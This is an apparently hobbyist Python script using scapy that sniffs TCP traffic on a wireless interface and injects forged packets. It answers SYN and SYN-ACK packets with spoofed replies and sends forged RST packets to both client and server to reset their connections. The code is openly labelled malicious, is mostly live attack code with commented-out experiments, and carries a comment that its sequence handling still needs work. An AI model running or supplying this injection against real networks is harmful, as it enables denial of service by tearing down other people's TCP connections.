#import the scapy library
from scapy.all import  *
import time

def capture_packet():	#function used to capture a single packet and return it, without storing it
			#iface->indicates our interface, prn->sends the packet to capture_packet,
			#will call this function multiple times, hence count = 1
			#optionally, filter = 'host 192.168.1.62'
	sniffed_packet = sniff(iface = 'wlan0', filter = 'tcp', count = 1)
	return sniffed_packet[0]	#get the first packet in the list (since we only capture 1 packet)

#packet_one = capture_packet()	#debugging
#packet_one.show()		#debugging

while True:		#sniff as many packets as the user defines, if the user defines a negative number,
			#sniff to infinity!
			#this is the input of the user
			#n = input('How many packets to sniff?\n (If negative: sniff to infinity!)\n')
	packet1 = capture_packet()
	###########################
	#print(packet1[Ether].src)
	#print(packet1[Ether].dst)
	
	#print(packet1[IP].src)
	#print(packet1[IP].dst)
	
	#print(packet1[TCP].ack)
	#print(packet1[TCP].seq)
	
	#print(packet1[TCP].flags)
	
	#send = sendp(packet1)
	
	#packet1.show()	#debugging
	############################
	#if packet1[TCP].syn == 1:
	#	print('syn is 1')
	
	##Swapping packet source and destination and sending it back to the host##
	#x = packet1[Ether].src
	#packet1[Ether].src = packet1[Ether].dst
	#packet1[Ether].dst = x
	
	#x = packet1[IP].src
	#packet1[IP].src = acket1[IP].dst
	#packet1[IP].dst = x
	#########################If we receive a SYN packet, send a falsified SYN-ACK to the host and a falsified ACK to the server####################
	#Set window size to 0 and swap source and destination to trick the host into thinking this is the server's response
	
	
	if packet1[TCP].flags == 'S':
		malicious_TCP_packet = Ether(dst = packet1[Ether].src, src = packet1[Ether].dst) \
					/IP(dst= packet1[IP].src, src = packet1[IP].dst)\
					/TCP(sport = packet1[TCP].dport, dport = packet1[TCP].sport, flags = 'SA', seq = 42069, ack = packet1[TCP].seq) 
					#We receive the SYN packet sent by the host, acknowledge the sent sequence number and propose a random seq number
					
	elif packet1[TCP].flags == 'SA':
		malicious_TCP_packet = Ether(dst = packet1[Ether].src, src = packet1[Ether].dst) \
					/IP(dst= packet1[IP].src, src = packet1[IP].dst)\
					/TCP(sport = packet1[TCP].dport, dport = packet1[TCP].sport, flags = 'A', seq = 42069, ack = packet1[TCP].seq)
					
		
	#elif packet1[TCP].flags == 'A':
	#	malicious_TCP_packet = Ether(dst = packet1[Ether].src, src = packet1[Ether].dst) \
	#				/IP(dst= packet1[IP].src, src = packet1[IP].dst)\
	#				/TCP(sport = packet1[TCP].dport, dport = packet1[TCP].sport, flags = 'SA', seq = 42069, ack = packet1[TCP].seq) 
	else:
		#Here we send two malicious packets (one to the client, one to the server) and reset the connection
		malicious_TCP_packet = Ether(dst = packet1[Ether].src, src = packet1[Ether].dst) \
					/IP(dst= packet1[IP].src, src = packet1[IP].dst)\
					/TCP(sport = packet1[TCP].dport, dport = packet1[TCP].sport, flags = 'R', seq = packet1[TCP].ack, ack = packet1[TCP].seq) 
		#send the first packet
		sendp(malicious_TCP_packet, iface = 'wlan0', verbose = 1)
		
		malicious_TCP_packet = Ether(dst = packet1[Ether].dst, src = packet1[Ether].src) \
					/IP(dst= packet1[IP].dst, src = packet1[IP].src)\
					/TCP(sport = packet1[TCP].sport, dport = packet1[TCP].dport, flags = 'R', seq = packet1[TCP].seq, ack = packet1[TCP].ack) ######## Needs work with seq and ack
	
	sendp(malicious_TCP_packet, iface = 'wlan0', verbose = 1)
	#else:
	#malicious_TCP_packet = Ether(dst = packet1[Ether].dst, src = packet1[Ether].src) \
	#			/IP(dst= packet1[IP].dst, src = packet1[IP].src)\
	#			/TCP(sport = packet1[TCP].sport, dport = packet1[TCP].dport, flags = 'C', window = 0, seq = packet1[TCP].seq, ack = packet1[TCP].ack + 800)
	#sendp(malicious_TCP_packet, iface = 'wlan0', verbose = 1)
		
		
	
	#packet1[TCP].seq = packet1[TCP].seq + 1
	#packet1[TCP].ack = 429496729			#packet1[TCP].ack + 1	#number needs to be < 4294967295
	
	#sendp(malicious_TCP_packet, iface = 'wlan0', verbose = 1)
